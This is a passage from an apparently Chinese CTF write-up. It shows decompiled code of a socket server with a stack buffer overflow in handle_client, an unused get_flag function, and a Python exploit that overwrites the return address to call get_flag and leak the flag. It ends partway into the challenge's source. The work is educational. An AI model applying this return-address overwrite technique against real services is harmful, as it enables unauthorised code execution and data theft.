keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  socklen_t addr_len<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-34h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+4h] [ebp-30h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span> addr<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+14h] [ebp-20h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+24h] [ebp-10h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+28h] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>p_argc<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+2Ch] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  p_argc <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  addr_len <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  fd <span class=\"token operator\">=</span> <span class=\"token function\">socket</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> fd <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"socket\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  addr<span class=\"token punctuation\">.</span>sa_family <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">.</span>sa_data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_WORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>addr<span class=\"token punctuation\">.</span>sa_data <span class=\"token operator\">=</span> <span class=\"token function\">htons</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x22B8u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">bind</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">,</span> <span class=\"token number\">0x10u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bind\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">listen</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"listen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Server listening on port %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8888</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    v7 <span class=\"token operator\">=</span> <span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>addr_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v7 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token function\">handle_client</span><span class=\"token punctuation\">(</span>v7<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">handle_client</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  size_t n<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+8h] [ebp-50h] BYREF</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token keyword\">int</span> buf<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-4Ch] BYREF</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token keyword\">char</span> v4<span class=\"token punctuation\">[</span><span class=\"token number\">68</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+10h] [ebp-48h] BYREF</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"client_sock: %d\\n\"</span><span class=\"token punctuation\">,</span> fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> buf <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">559038737</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>n<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Received content: %s\\n\"</span><span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid magic number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>还有一个定义了但是没有使用的方法</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// address 0x08049266</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> __cdecl <span class=\"token function\">get_flag</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  size_t v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-8Ch] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  FILE <span class=\"token operator\">*</span>stream<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+8Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  stream <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> stream <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span> stream<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      v1 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fgets\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fopen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>先接收 magic number</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">(</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>n<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> struct</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>MAGIC <span class=\"token operator\">=</span> <span class=\"token number\">0xdeadbeef</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>SIZE <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>CONTENT <span class=\"token operator\">=</span> <span class=\"token string\">b\"\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>CONTENT <span class=\"token operator\">+=</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x48</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x4</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>CONTENT <span class=\"token operator\">+=</span> struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08049266</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># get_falg 的地址</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>CONTENT <span class=\"token operator\">+=</span> struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># </span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>CONTENT <span class=\"token operator\">+=</span> struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># client sock</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">with</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        s<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>example<span class=\"token punctuation\">.</span>com<span class=\"token punctuation\">,</span> <span class=\"token number\">8888</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        s<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span>MAGIC<span class=\"token punctuation\">.</span>to_bytes<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'little'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        s<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span>SIZE<span class=\"token punctuation\">.</span>to_bytes<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'little'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        s<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span>CONTENT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        flag <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Received flag:\"</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    exploit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>找出题的同学要了源码</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;arpa/inet.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MAGIC</span> <span class=\"token expression\"><span class=\"token number\">0xdeadbeef</span></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">FLAG_FILE</span> <span class=\"token string\">\"flag\"</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PORT</span> <span class=\"token expression\"><span class=\"token number\">8888</span></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">get_flag</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> client_sock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    FILE <span class=\"token operator\">*</span>file <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span>FLAG_FILE<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fopen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">char</span> flag<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> file<span 